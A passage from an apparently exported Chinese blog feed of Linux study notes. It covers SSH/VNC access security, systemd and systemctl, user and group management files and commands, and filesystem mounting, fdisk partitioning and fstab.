<li>针对Chrootderectory设置的目录及所有的上级文件夹的目录权限</li>
<li>属主和属组必须是root</li>
<li>只有属主也就是root有写权限，也就是说最大权限为755</li>
<li>由于文件夹权限问题，sftp账号都不具有写权限，因此宿主目录创建一个具有写权限的目录，用于资源共享</li>
</ul>
</li>
<li>具体配置自行Google</li>
</ul>
</li>
</ul>
</li>
<li>远程访问安全VNC<ul>
<li>简介<ul>
<li>虚拟网络计算机</li>
<li>类似Windows的远程桌面</li>
<li>ssh为命令行模式，vnc为图形界面</li>
</ul>
</li>
<li>安装VNC-server <ul>
<li>yum安装，安装在服务端</li>
<li>tigervnc -server 和tigervnc。注：针对的是centos的vnc</li>
</ul>
</li>
<li>服务端 配置VNC-server并启动<ul>
<li>通过配置文件的文件名可以指定支持的连接，如3表示连接3</li>
<li>配置文件内容可以指定连接的用户，针对服务端，如admin用户</li>
<li>切换到admin用户后启动，与前面相对应</li>
<li>首次运行，需要配置口令</li>
</ul>
</li>
<li>客户端 测试连接<ul>
<li>Linux端，安装tigervnc，vncviewer启动，弹出窗口，输入服务端IP:3，输入为admin设置的口令</li>
<li>Windows端，安装tigervnc，运行tigervnc viewer，输入同上</li>
<li>3表示之前服务端配置文件设置的连接</li>
</ul>
</li>
<li>使用的简单总结<ul>
<li>服务端指定连接ID为3，允许连接的用户admin，和为admin设置的口令</li>
<li>客户端提供连接ID和用户和用户口令来连接客户端</li>
<li>这样的连接是不安全的</li>
</ul>
</li>
<li>利用ssh隧道，增加安全性<ul>
<li>构建端口转发（隧道），本地IP的5903到远程IP的5903</li>
<li>ssh连接远程目标主机</li>
<li>ssh连接成功后，vncviewer连接，注：连接的IP为127.0.0.1</li>
</ul>
</li>
</ul>
</li>
<li>服务进程安全控制<ul>
<li>systemd的优势<ul>
<li>并行处理所有服务，加快开机速度<ul>
<li>旧init启动脚本依序一项项启动模式，类似单序列串行，不相关的服务也要排队进行</li>
<li>CPU是多核心，可以并行多个任务，操作系统也是多任务，不必让不相关进程排队等待</li>
<li>systemd解决了这样的问题，可并发处理多任务</li>
</ul>
</li>
<li>统一管理，on-demand，按需启动服务<ul>
<li>仅需要一个systemd服务加systemctl指令来处理，不需要额外指令的支持，不像systemV需要其他指令</li>
<li>可以常驻内存，按需处理后续的daemon启动任务</li>
</ul>
</li>
<li>服务依存关系自我检查<ul>
<li>自动检查服务启动所需的依存关系，方便好多</li>
</ul>
</li>
<li>根据daemon功能进行分类<ul>
<li>daemon为守护进程</li>
<li>定义所有的服务为一个服务单元unit，并归类于不同的服务类别type中</li>
<li>如系统服务service，套接字服务socket，多目标服务target等</li>
<li>旧的init仅分为独立和超级守护进程，显然不够</li>
</ul>
</li>
<li>将多个守护进程集合成一个群组<ul>
<li>类似于systemV的init有多个运行级别</li>
<li>将多个功能集成一个target项目，构建了一个操作项目</li>
<li>执行某个target就执行了多个daemon，营造了某种操作环境</li>
</ul>
</li>
<li>向下兼容旧的init服务脚本</li>
</ul>
</li>
<li>其配置文件保存的主要目录<ul>
<li>/usr/lib/systemd/system，记作目录1<ul>
<li>存放各服务主要的启动脚本</li>
<li>类似etc/init.d下的文件</li>
</ul>
</li>
<li>/run/systemd/system，目录2<ul>
<li>系统执行过程中产生的服务脚本</li>
<li>优先级比前者高</li>
</ul>
</li>
<li>/etc/systemd/system，目录3<ul>
<li>管理员依据系统需求所创建的执行脚本</li>
<li>类似/etc/rc.d/rc5.d/S*的功能</li>
<li>优先级比前者高</li>
</ul>
</li>
<li>总结<ul>
<li>系统开机是否执行某服务是看目录3，实为链接文件</li>
<li>实际执行的脚本文件文件位于1，若修改设置，去1修改</li>
</ul>
</li>
</ul>
</li>
<li>systemd的unit类型分类说明<ul>
<li>.service<ul>
<li>一般服务类型，主要指系统服务</li>
<li>包括服务器本身所需的本机服务和网络服务</li>
</ul>
</li>
<li>.socket <ul>
<li>主要用于内部进程信息交换</li>
</ul>
</li>
<li>.target <ul>
<li>执行环境类型</li>
<li>一群unit的集合，可能包含多个service和socket</li>
</ul>
</li>
<li>.mount和.automount <ul>
<li>文件系统挂载相关服务</li>
</ul>
</li>
<li>.path <ul>
<li>检测特定的文件或目录类型</li>
</ul>
</li>
<li>.timer <ul>
<li>循环执行的服务</li>
<li>有时间特征的，如某一刻将要执行的</li>
</ul>
</li>
</ul>
</li>
<li>systenctl命令格式<ul>
<li>systemctl command unit</li>
<li>可用command<ul>
<li>start，stop，restart</li>
<li>reload：重新载入unit的配置，修改后的配置生效</li>
<li>enable，disable：开机自启动与否</li>
<li>status，is-active，is-enable</li>
<li>mask，unmask：强制注销的设置及取消</li>
</ul>
</li>
</ul>
</li>
<li>服务单元unit的常见状态<ul>
<li>systemctl status unit命令</li>
<li>运行状态<ul>
<li>active（running</li>
<li>active（exited：仅运行一次就结束的</li>
<li>active（waiting：处于等待状态</li>
<li>inactive</li>
</ul>
</li>
<li>daemon的预设状态<ul>
<li>也就是这个unit的原先属性</li>
<li>enable，disable：是否开机自启</li>
<li>static：自己不启动，由其他服务唤醒</li>
<li>mask<ul>
<li>被设置为强制注销状态</li>
<li>此daemon无论如何不会启动；</li>
<li>可通过unmask取消</li>
<li>当注销一个服务时，systemctl将服务链接到/dev/null空设备</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>查看系统服务<ul>
<li>列出已经启动的unit<ul>
<li>systemctl list-units</li>
<li>后面子命令可以不写</li>
</ul>
</li>
<li>列出已经安装的unit<ul>
<li>systemctl list-unit-files</li>
</ul>
</li>
<li>列出指定类型的<ul>
<li>systemctl list-units —type=service —all</li>
</ul>
</li>
</ul>
</li>
<li>通过systemctl管理不同操作环境（target unit<ul>
<li>在centos 7预设下，有26个target unit<ul>
<li>graphical：GUI模式，包含multi-user</li>
<li>multi-user：纯字符模式</li>
<li>rescue：救援模式</li>
<li>emergency：紧急模式，无法进入救援时</li>
<li>shutdown：关机</li>
<li>getty：修改tty设置</li>
</ul>
</li>
<li>systemctl command unit.target<ul>
<li>常用command<ul>
<li>get-default：取得目前的target</li>
<li>set-default：设置为下一次启动时的模式</li>
<li>isolate：直接切换到后面的模式，实时的，无需重启</li>
</ul>
</li>
</ul>
</li>
<li>提供简单指令进行模式切换。<ul>
<li>systemctl poweroff</li>
<li>reboot</li>
<li>suspend：暂停</li>
<li>hibernate：休眠</li>
<li>rescue</li>
<li>emergency</li>
</ul>
</li>
</ul>
</li>
<li>分析各服务依存关系<ul>
<li>systemctl list-dependencies [unit] [—reverse]</li>
<li>reverse参数，反向追踪谁在使用此unit</li>
<li>不加unit，会分析当前target使用哪些unit</li>
</ul>
</li>
<li>systemctl服务配置文件<ul>
<li>存放目录<ul>
<li>如/usr/lib/systemd/system/sshd.service </li>
</ul>
</li>
<li>其内容通常由三个字段组成<ul>
<li>unit字段<ul>
<li>unit本身的说明</li>
<li>与其他daemon的设置，如启动先后问题</li>
</ul>
</li>
<li>service/socket/timer等<ul>
<li>不同unit type对应相对应的配置项目，如sshd.service 服务就使用SERVICE这个字段</li>
<li>此字段内指定服务启动脚本，环境变量等</li>
</ul>
</li>
<li>install字段<ul>
<li>指定此unit会安装到哪些target中</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>配置文件参数说明<ul>
<li>unit字段部分<ul>
<li>description<ul>
<li>使用systemctl list-units或systemctl status时，输出的说明信息</li>
</ul>
</li>
<li>documentation<ul>
<li>更详尽的说明信息</li>
<li>其帮助信息可以位于<ul>
<li>某URL</li>
<li>某条命令</li>
<li>某本地文档</li>
</ul>
</li>
</ul>
</li>
<li>after<ul>
<li>说明在某daemon之后才可以启动</li>
<li>仅仅说明启动顺序，并非强制要求，也非依存关系</li>
</ul>
</li>
<li>before<ul>
<li>与上相反，在某之前</li>
</ul>
</li>
<li>require<ul>
<li>明确定义在某daemon启动后才可以启动</li>
<li>指定依存关系</li>
</ul>
</li>
<li>wants<ul>
<li>与上相反</li>
<li>启动了之后还需要启动什么才可以构建出更好的操作环境</li>
<li>目的是建立更好的应用环境</li>
</ul>
</li>
<li>conflicts<ul>
<li>代表冲突的服务</li>
<li>若此参数值为a，则a启动后，此unit不可启动</li>
</ul>
</li>
</ul>
</li>
<li>service部分（service为例，也可为target等<ul>
<li>Type：启动方式，会影响execstart</li>
<li>ExecStart：实际要执行的daemon指令或脚本程序</li>
<li>…</li>
</ul>
</li>
<li>install部分<ul>
<li>WantedBy：表示此unit是附加在哪个target下</li>
<li>Also：当前unit为enable时，此选项的也会enable，解决服务依存关系</li>
<li>Alias</li>
</ul>
</li>
</ul>
</li>
<li>配置文件实例说明<ul>
<li>vsftpd配置文件</li>
<li>以getty为例讲解多重的重复设置</li>
<li>定制自己的服务</li>
</ul>
</li>
<li>systemctl服务针对timer的配置文件<ul>
<li>定制在未来某个时间或定期循环执行的服务<ul>
<li>前提<ul>
<li>系统的timer.target要启动</li>
<li>要有xxx.service的服务</li>
<li>要有xxx.timer的定时启动服务存在</li>
</ul>
</li>
<li>例如定期备份的循环任务</li>
</ul>
</li>
</ul>
</li>
<li>centos 7.x默认的启动服务简介</li>
<li>centis 7.x 常用的其他服务简介</li>
</ul>
</li>
<li>弱口令检测</li>
<li>开放端口安全检测</li>
<li>日志分析与安全</li>
</ul>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux-用户和用户组管理</title>
    <url>/2017/12/25/etc/%E7%94%A8%E6%88%B7%E5%92%8C%E7%94%A8%E6%88%B7%E7%BB%84%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h1 id="用户和用户组管理"><a href="#用户和用户组管理" class="headerlink" title="用户和用户组管理"></a>用户和用户组管理</h1><h2 id="用户配置文件"><a href="#用户配置文件" class="headerlink" title="用户配置文件"></a>用户配置文件</h2><ul>
<li>简介<ul>
<li>Linux中主要通过用户配置文件来查看和修改用户信息</li>
<li>服务器安全性能要求越高，越需要建立合理的用户权限等级制度和服务器操作规范</li>
</ul>
</li>
<li>用户信息文件：/etc/passwd<ul>
<li>每一行记录为一个用户<a id="more"></a></li>
<li>冒号分隔各字段</li>
<li>七个字段<ul>
<li>用户名<ul>
<li>不可用系统不可接受的特殊字符</li>
<li>尽量有含义，便于辨认</li>
</ul>
</li>
<li>密码标志<ul>
<li>早期Linux密码存放于此</li>
<li>x-表示此用户存在密码；空-无密码<ul>
<li>无密码登录仅可本机，不允许远程</li>
</ul>
</li>
</ul>
</li>
<li>用户ID，UID<ul>
<li>0-超级用户</li>
<li>1-499:系统用户（伪用户<ul>
<li>系统调用相关用户</li>
<li>不可登录</li>
<li>不可删除</li>
</ul>
</li>
<li>500-65535:普通用户</li>
<li>将UID改为0即可把普通用户升级为超级用户</li>
</ul>
</li>
<li>GID（用户初始组ID<ul>
<li>初始组<ul>
<li>用户一建立就默认加入的组</li>
<li>初始组只有一个且必须有</li>
<li>一般，此组名与用户名相同</li>
</ul>
</li>
<li>附加组<ul>
<li>用户可加入其他组，并拥有其权限</li>
<li>附加组可有对个</li>
</ul>
</li>
</ul>
</li>
<li>用户说明</li>
<li>用户主目录（家目录<ul>
<li>普通用户：/home/用户名/</li>
<li>超级用户root：/root/</li>
</ul>
</li>
<li>登录之后的shell<ul>
<li>shell为Linux的命令解释器</li>
<li>超级用户及普通用户需要登录：/bin/bash</li>
<li>系统用户不可登录：/sbin/nologin</li>
<li>暂时冻结用户，可更改其shell为nologin</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>影子文件：/etc/shadow<ul>
<li>权限很小为：000，只有root可操作</li>
<li>9个字段<ul>
<li>1，用户名</li>
<li>2，加密密码<ul>
<li>加密算法升级为SHA512散列加密算法，比之前MD5先进，安全系数更高</li>
<li>若密码位为“！！”或“*”，表示没有密码，不可以登录；可以用此方法临时禁用某用户</li>
<li>root密码123，test密码也为123；加密后也不同，不会通过此方法来破解</li>
<li>暴力破解会有几率成功，故此文件重点保护，绝不轻易泄漏</li>
</ul>
</li>
<li>3，密码最后一次修改日期<ul>
<li>距离标准时间的天数</li>
<li>标准时间为：1970.01.01</li>
<li>每过一天时间戳加一</li>
</ul>
</li>
<li>4，两次密码的修改时间间隔<ul>
<li>和第3字段相比</li>
<li>若为10，表10天后才可改密码</li>
</ul>
</li>
<li>5，密码有效期<ul>
<li>和第3字段相比</li>
<li>若为10，表10天后过期（即规定每10天修改一次密码</li>
<li>对应密码实效性原则（还有复杂性和易记性</li>
</ul>
</li>
<li>6，密码过期前的警告天数<ul>
<li>过期前</li>
<li>和第5字段相比</li>
<li>若为10，若失效日期为15，则5号时提醒修改密码</li>
</ul>
</li>
<li>7，密码过期后的宽限时间<ul>
<li>过期后</li>
<li>和第5字段相比</li>
<li>0或空着表示过期后立即失效</li>
<li>-1表示密码永不会失效</li>
<li>若为10，表密码过期后，再多给10天宽限，10天后失效</li>
</ul>
</li>
<li>8，账号失效时间<ul>
<li>时间戳表示</li>
<li>优先级高于以上的有效期相关字段</li>
</ul>
</li>
<li>9，保留字段</li>
</ul>
</li>
<li>时间戳与日期的换算（利用公式</li>
</ul>
</li>
<li>组相关文件<ul>
<li>组信息文件：/etc/group<ul>
<li>四个字段<ul>
<li>1，组名</li>
<li>2，组密码标志</li>
<li>3，GID</li>
<li>4，组中附加用户<ul>
<li>看不见初始用户</li>
<li>初始用户或初始组需要passed和group两个文件对照来看</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>组密码文件：/etc/gshadow<ul>
<li>四个字段<ul>
<li>1，组名</li>
<li>2，组密码<ul>
<li>并不常见且不推荐使用</li>
</ul>
</li>
<li>3，组管理用户组</li>
<li>4，组中附加用户</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="用户管理相关文件"><a href="#用户管理相关文件" class="headerlink" title="用户管理相关文件"></a>用户管理相关文件</h2><ul>
<li>1，用户的家目录<ul>
<li>简介<ul>
<li>创建用户时自动生成</li>
<li>普通用户改为超级用户时，仅获取了相关权限，其目录未变</li>
</ul>
</li>
<li>普通用户<ul>
<li>/home/用户名/</li>
<li>所有者和所属组都是此用户</li>
<li>700权限</li>
</ul>
</li>
<li>超级用户<ul>
<li>/root/</li>
<li>所有者和所属组都是root用户</li>
<li>550权限</li>
</ul>
</li>
</ul>
</li>
<li>2，用户的邮箱<ul>
<li>创建用户时默认生成</li>
<li>/var/spool/mail/用户名/</li>
<li>var：Linux下可变数据的保存目录</li>
</ul>
</li>
<li>3，用户模板目录<ul>
<li>/etc/skel/</li>
<li>创建新用户时会从此目录拷贝文件作为其家目录下的默认文件</li>
<li>可以在此自定义其他文件，创建新用户时会生成相应文件</li>
<li>作为一个模板</li>
</ul>
</li>
</ul>
<h2 id="用户管理命令"><a href="#用户管理命令" class="headerlink" title="用户管理命令"></a>用户管理命令</h2><ul>
<li>命令归根结底操作的是配置文件</li>
<li>用户添加命令：useradd<ul>
<li>格式：useradd+选项+用户名</li>
<li>常见选项<ul>
<li>u：手工指定uid</li>
<li>d：指定家目录</li>
<li>c：指定用户说明</li>
<li>g：指定用户初始组</li>
<li>G：指定用户附加组</li>
<li>s：指定用户登录shell；默认为/bin/bash/</li>
</ul>
</li>
<li>执行结果<ul>
<li>passwd、shadow、group、gshadow文件会新增记录</li>
<li>生成相应家目录</li>
<li>生成相应邮箱目录</li>
</ul>
</li>
<li>用户默认值文件<ul>
<li>新建用户时的默认值设置，如默认的shell为/bin/bash</li>
<li>/etc/default/useradd<ul>
<li>用户家目录</li>
<li>默认shell</li>
<li>是否创建邮箱</li>
<li>…</li>
</ul>
</li>
<li>/etc/logindefs<ul>
<li>密码有效期</li>
<li>密码修改间隔</li>
<li>密码最小位数等</li>
<li>密码的加密方式（前期是md5</li>
<li>……</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>修改用户密码：passwd<ul>
<li>格式：passwd+选项+用户名</li>
<li>常用选项<ul>
<li>不加：给用户设置密码</li>
<li>S：查询用户的密码状态（仅root可用</li>
<li>l：暂时锁定用户（仅root可用</li>
<li>u：解锁用户（仅root可用</li>
<li>—stdin：可通过管道符输出的数据作为用户的密码<ul>
<li>多用于shell编程批量操作时</li>
</ul>
</li>
</ul>
</li>
<li>改密码相关<ul>
<li>超级用户<ul>
<li>可更改包括自己在内的所有用户</li>
<li>需要指定用户名</li>
<li>可不遵守密码复杂性的原则</li>
</ul>
</li>
<li>普通用户<ul>
<li>只可更改自己</li>
<li>直接passwd即可</li>
<li>需遵守密码复杂性原则</li>
</ul>
</li>
<li>输密码时字符不可见</li>
<li>删除键也会视为字符</li>
</ul>
</li>
</ul>
</li>
<li>修改用户信息：usermod<ul>
<li>格式：usermod+选项+用户名</li>
<li>类似useradd+选项命令</li>
<li>add针对新用户，mod针对已存在用户</li>
<li>大部分选项同useradd，如u、c、G</li>
<li>L：锁定用户；U：解锁用户（同passwd作用类似</li>
</ul>
</li>
<li>修改用户密码状态：chage<ul>
<li>格式：chage+选项+用户名</li>
<li>效果同手工修改shadow文件</li>
<li>l：列出用户的详细密码状态</li>
<li>d：更改密码最后一次修改时间这一字段<ul>
<li>-d 0:把密码修改日期更改为零</li>
<li>用户一登录就要修改密码</li>
</ul>
</li>
</ul>
</li>
<li>删除用户：userdel<ul>
<li>userdel -r 用户名<ul>
<li>r表示删除用户同时删除其家目录</li>
<li>推荐使用此选项，否则还要手工删除目录</li>
</ul>
</li>
<li>效果同手工删除（删除相关文件的记录及相关目录</li>
</ul>
</li>
<li>查看用户ID：id<ul>
<li>id+用户名</li>
<li>显示用户ID、组ID信息</li>
</ul>
</li>
<li>用户切换命令：su<ul>
<li>格式：su+选项+用户名</li>
<li>root切换普通不需要密码，反之需要</li>
<li>选项<ul>
<li>不加：环境变量不会切换（env命令查看<ul>
<li>su root</li>
</ul>
</li>
<li>-：选项仅使用-表示连带用户的环境变量一起切换<ul>
<li>su - root</li>
</ul>
</li>
<li>-c：仅执行一次命令，而不切换用户身份<ul>
<li>su - root -c “命令”</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="用户组管理命令"><a href="#用户组管理命令" class="headerlink" title="用户组管理命令"></a>用户组管理命令</h2><ul>
<li>添加用户组<ul>
<li>groupadd +选项+组名</li>
<li>不加：默认gid，依次增加</li>
<li>g：指定gid</li>
</ul>
</li>
<li>修改用户组<ul>
<li>g：修改组ID</li>
<li>n：修改组名</li>
</ul>
</li>
<li>删除用户组<ul>
<li>groupdel</li>
<li>删除前提：此组里没有初始用户（是否有附加用户不影响</li>
</ul>
</li>
<li>把用户添加入组或从组中删除<ul>
<li>a+用户名+组名：添加（附加用户</li>
<li>d+用户名+组名：删除</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux-文件系统管理</title>
    <url>/2017/12/25/etc/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h1 id="文件系统管理"><a href="#文件系统管理" class="headerlink" title="文件系统管理"></a>文件系统管理</h1><h2 id="回顾分区和文件系统"><a href="#回顾分区和文件系统" class="headerlink" title="回顾分区和文件系统"></a>回顾分区和文件系统</h2><ul>
<li>详情：Linux系统安装——系统分区相关</li>
</ul>
<h2 id="文件系统常用命令"><a href="#文件系统常用命令" class="headerlink" title="文件系统常用命令"></a>文件系统常用命令</h2><ul>
<li>df、du、fsck、dumpe2fs等命令<ul>
<li>文件系统查看命令：df<ul>
<li>格式：df+选项+挂载点<a id="more"></a></li>
<li>常用选项<ul>
<li>a：显示所有文件信息，包括特殊文件系统，如/proc/、/sysfs</li>
<li>h：使用习惯单位显示容量，如KB、MB、GB，最常用</li>
<li>T：显示文件系统类型</li>
<li>m：以MB为单位显示容量</li>
<li>k：以KB为单位显示容量，默认</li>
</ul>
</li>
</ul>
</li>
<li>统计目录或文件大小：du<ul>
<li>du+选项+目录或文件名</li>
<li>一般不使用其看文件大小，直接ls -l即可</li>
<li>ls -l查看目录大小仅是查看其子目录下文件名的占用大小，不针对文件具体数据大小</li>
<li>常用选项<ul>
<li>a：显示每个子文件的磁盘占有量；默认只统计子目录的</li>
<li>h：使用习惯单位显示容量，如KB、MB、GB，最常用</li>
<li>s：统计总占有量，而不列出子目录和子文件的占有量</li>
</ul>
</li>
</ul>
</li>
<li>du和df的区别<ul>
<li>df：面向文件系统，不光考虑文件占用空间，还要统计被命令或程序占用的空间（如文件已删除，但程序并没有释放空间</li>
<li>du：面向文件，只计算目录或文件占用的空间</li>
</ul>
</li>
<li>文件系统修复命令：fsck<ul>
<li>fsck+选项+分区设备文件名</li>
<li>无需手动运行，系统开机时自动运行</li>
<li>了解即可，不常用，有时修复后反而出错</li>
<li>a：不显示用户提示，自动修复文件系统</li>
<li>y：自动修复。同a作用相同，有的文件系统只支持y</li>
</ul>
</li>
<li>显示磁盘状态命令：dumpe2fs<ul>
<li>+分区设备文件名</li>
<li>命令本身不难，输出的结果复杂</li>
</ul>
</li>
</ul>
</li>
<li>挂载命令：mount<ul>
<li>简介<ul>
<li>进行设备挂载，Linux所有存储设备使用前都需要挂载，如硬盘、软盘、光盘、U盘、移动硬盘</li>
<li>硬盘是系统自动挂载，但光盘等需要手动挂载</li>
<li>挂载：将设备文件名与挂载点建立连接，通过挂载点访问设备</li>
<li>挂载即win中分配盘符；挂载点对应盘符；win中是自动进行的，Linux需要手工</li>
</ul>
</li>
<li>查询与自动挂载<ul>
<li>l或不加选项：查询系统中已挂载的设备，l会显示卷标名称</li>
<li>a：依据配置文件/etc/fstab的内容，自行挂载</li>
</ul>
</li>
<li>挂载命令格式<ul>
<li>mount （-t 文件系统）（-L 卷标名）（-o 特殊选项）+设备文件名+挂载点</li>
<li>t：指定挂载的文件系统类型，可ext3，ext4，iso9660</li>
<li>L：挂载指定卷标分区，而不是设备文件名挂载（一个别名，用处不大</li>
<li>o：指定挂载的额外选项（如remount、noexec</li>
</ul>
</li>
</ul>
</li>
<li>挂载光盘与U盘<ul>
<li>挂载光盘相关<ul>
<li>建立挂载点，即创建盘符<ul>
<li>mkdir /mnt/cdrom/</li>
<li>/media/挂载光盘；/mnt/挂U盘；</li>
<li>早期只有mnt目录；哪个目录作为挂载点随便，只要是一个空目录</li>
</ul>
</li>
<li>光盘插入光驱<ul>
<li>正式挂载前需要插入光驱</li>
<li>物理机即放入光盘</li>
<li>虚拟机进行相关操作</li>
</ul>
</li>
<li>挂载光盘<ul>
<li>mount -t iso9660 /dev/cdrom /mnt/cdrom/</li>
<li>mount /dev/sr0 /mnt/cdrom/</li>
<li>光盘默认的文件系统为iso9660</li>
<li>cdrom和sr0代表相同光盘，使用哪个名称均可以，只不过一方是软链接，即快捷方式</li>
<li>若有第二块，则为cdrom1和sr1</li>
</ul>
</li>
<li>卸载光盘<ul>
<li>若都为物理机，Windows直接弹出光盘即可，Linux需要先卸载，再按弹出光盘</li>
<li>win的分配盘符和取消盘符都是自动进行，但Linux需要手动，因此要手动取消盘符，即卸载光盘。二者原理相同，自动与手动的区别</li>
<li>格式：umount + 设备文件名或挂载点<ul>
<li>两者均可</li>
<li>因为挂载后，两者建立连接，都表示同一光盘，任一均可</li>
</ul>
</li>
</ul>
</li>
<li>其它<ul>
<li>光盘是只读，不可写</li>
<li>挂载后会提示“光盘有写保护，以readonly方式挂载”，可作为挂载成功的标志</li>
</ul>
</li>
</ul>
</li>
<li>挂载U盘<ul>
<li>插入U盘<ul>
<li>插入时不可以在远程工具连接时，在Linux本身</li>
<li>若是虚拟机，一定进入Linux的虚拟机，否则插入后被物理机识别</li>
</ul>
</li>
<li>找到U盘设备文件名<ul>
<li>U盘的设备文件名不是固定的</li>
<li>U盘的命名同硬盘，名字不确定，取决于系统已经存在的硬盘数目，如已经有一块，则为sdb，已经有两块，则为sdc</li>
<li>fdisk -l命令，</li>
<li>如/dev/sdb1，注意要有分区号</li>
</ul>
</li>
<li>创建挂载点</li>
<li>挂载U盘<ul>
<li>mount -t vfat /dev/sdb1 /mnt/usb/</li>
<li>Linux中，FAT16识别为fat，FAT32识别为vfat</li>
<li>Linux默认不支持NTFS文件系统，如ntfs的移动硬盘默认不可以挂载成功</li>
</ul>
</li>
<li>卸载U盘</li>
</ul>
</li>
</ul>
</li>
<li>支持NTFS文件系统<ul>
<li>简介<ul>
<li>Linux默认不支持NTFS文件系统，如ntfs的移动硬盘默认不可以挂载成功</li>
<li>Linux绝大情况下都不需要手动安装驱动，内核默认存在许多常见硬件的驱动，自行安装</li>
<li>windows安装后需要给所有硬件安装驱动后才可以使用，手工安装或更新</li>
<li>Linux手工安装的情况<ul>
<li>内核发布过早，较新的硬件驱动需自行安装</li>
<li>像ntfs文件系统的移动硬盘，需要自己安装驱动</li>
</ul>
</li>
</ul>
</li>
<li>两种方法<ul>
<li>重新编译内核，将ntfs驱动加进来（底层操作，不建议</li>
<li>利用第三方软件<ul>
<li>NTFS-3G插件<ul>
<li>下载安装</li>
<li>使用：mount -t ntfs-3g+分区设备文件名+挂载点</li>
<li>注意特定的文件系统类型</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="fdisk分区"><a href="#fdisk分区" class="headerlink" title="fdisk分区"></a>fdisk分区</h2><ul>
<li>fdisk命令分区过程<ul>
<li>1，添加硬盘（关机断电情况下</li>
<li>2，查看新硬盘（fdisk -l</li>
<li>3，fdisk命令分区<ul>
<li>fdisk /dev/sdb</li>
<li>注意：还未分区，不写分区号</li>
</ul>
</li>
<li>4，进入交互模式<ul>
<li>常用fdisk交互指令<ul>
<li>d：删除分区</li>
<li>n：新建分区</li>
<li>t：改变分区的系统id</li>
<li>l：显示已知的文件系统类型（82位Linux swap 分区，83为Linux标准分区</li>
<li>p：显示分区列表</li>
<li>q：不保存退出</li>
<li>w：保存退出</li>
</ul>
</li>
<li>输错字符，要删除时，需按着ctrl键</li>
</ul>
</li>
<li>5，开始分区（主分区为例<ul>
<li>键入n，新建分区</li>
<li>选择分区类型，扩展分区或主分区（先主分区；逻辑分区要等扩展分区创建后才可以</li>
<li>选择分区号，1-4（一般从1开始，按顺序连续分区，不留间隔</li>
<li>选择开始柱面（可理解为一个硬盘由许多柱面组成</li>
<li>选择结束柱面<ul>
<li>作为第一块分区终点</li>
<li>也要连续分配，不留间隔</li>
<li>可以选择以柱面分配，也可以用K、M、G等熟悉的空间单位，如+2G</li>
<li>注意用KMG单位时要带+</li>
</ul>
</li>
</ul>
</li>
<li>6，保存退出才可生效：w</li>
<li>7，重新读取分区表信息<ul>
<li>partprobe命令</li>
<li>有时分区表正在占用，系统提示重新启动后分区才可生效</li>
<li>避免重启，用此命令</li>
<li>可作为分区的标准执行步骤，每次分区后都执行</li>
</ul>
</li>
<li>8，格式化分区<ul>
<li>mkfs -t ext4 /dev/sdb1</li>
<li>将指定分区格式化为指定文件系统类型</li>
</ul>
</li>
<li>9，建立挂载点并挂载<ul>
<li>mkdir /disk1/</li>
<li>mount /dev/sdb1 /disk1/</li>
<li>fdisk命令只能查看硬盘是否被分区</li>
<li>查看是否被挂载要用mount或df</li>
</ul>
</li>
</ul>
</li>
<li>分区自动挂载<ul>
<li>默认下：分区在每次系统重启都需要手工挂载</li>
<li>要实现自动挂载，归根结底要写入文件，/etc/fstab</li>
<li>fstab文件的六个字段<ul>
<li>1，分区设备文件名或UUID（硬盘通用唯一标示码<ul>
<li>尽量采用uuid</li>
<li>dumpe2fs + /dev/sdb1查看某分区设备的uuid</li>
</ul>
</li>
<li>2，挂载点</li>
<li>3，文件系统名称</li>
<li>4，挂载权限参数<ul>
<li>一般为default权限</li>
<li>其权限与mount命令时的挂载权限是通用的</li>
</ul>
</li>
<li>5，指定分区是否被dump备份<ul>
<li>dump为Linux的备份命令</li>
<li>备份目录：此分区对应目录下的lost+found目录（只针对是分区的目录，其子分区不会有</li>
<li>0表不备份</li>
<li>1表每天备份</li>
<li>2表不定期备份</li>
</ul>
</li>
<li>6，指定分区是否被fsck检测<ul>
<li>fsck检测命令不需手工，系统会自动进行</li>
<li>0表不检测</li>
<li>其它数字代表检测的优先级</li>
<li>数字越小优先级越高，1比2高</li>
<li>手工添加的分区不应该为1，系统根分区的为1</li>
</ul>
</li>
</ul>
</li>
<li>实现自动挂载，按照fstab文件格式添加相应记录即可<ul>
<li>vi /etc/fstab</li>
<li>添加：/dev/sdb1 /disk1 ext4 default 1 2</li>
</ul>
</li>
<li>自动挂载<ul>
<li>mount -a</li>
<li>依据fstab命令，实现自动挂载</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="etc-fstab文件修复"><a href="#etc-fstab文件修复" class="headerlink" title="/etc/fstab文件修复"></a>/etc/fstab文件修复</h2><ul>
<li>fstab为系统重要文件，毁坏后系统可能启动异常</li>
<li>启动时报错，仍可输入密码后进入<ul>
<li>前提是根分区那条目录没有出错</li>
<li>否则连报错都不出现，直接崩溃，何谈进入系统</li>
</ul>
</li>
<li>尝试修改fstab文件，发现只读</li>
<li>重新挂载根分区，使其可写，mount -o remount，rw /</li>
<li>修改fstab错误，保存</li>
<li>重启测试文件修复成功</li>
</ul>
<h2 id="分配swap分区"><a href="#分配swap分区" class="headerlink" title="分配swap分区"></a>分配swap分区</h2><ul>
<li>简介<ul>
<li>系统必须分配swap作为系统分区</li>
<li>若使用过程中发现swap分区不够大，可扩充</li>
</ul>
</li>
<li>free命令<ul>
<li>查看内存与swap分区使用状况</li>
<li>加m参数，以M单位来显示</li>
<li>cache（缓存）：是指把读取出来的数据保存在内存当中，当再次读取时，不用读取硬盘而直接从内存当中读取，加速数据读取过程</li>
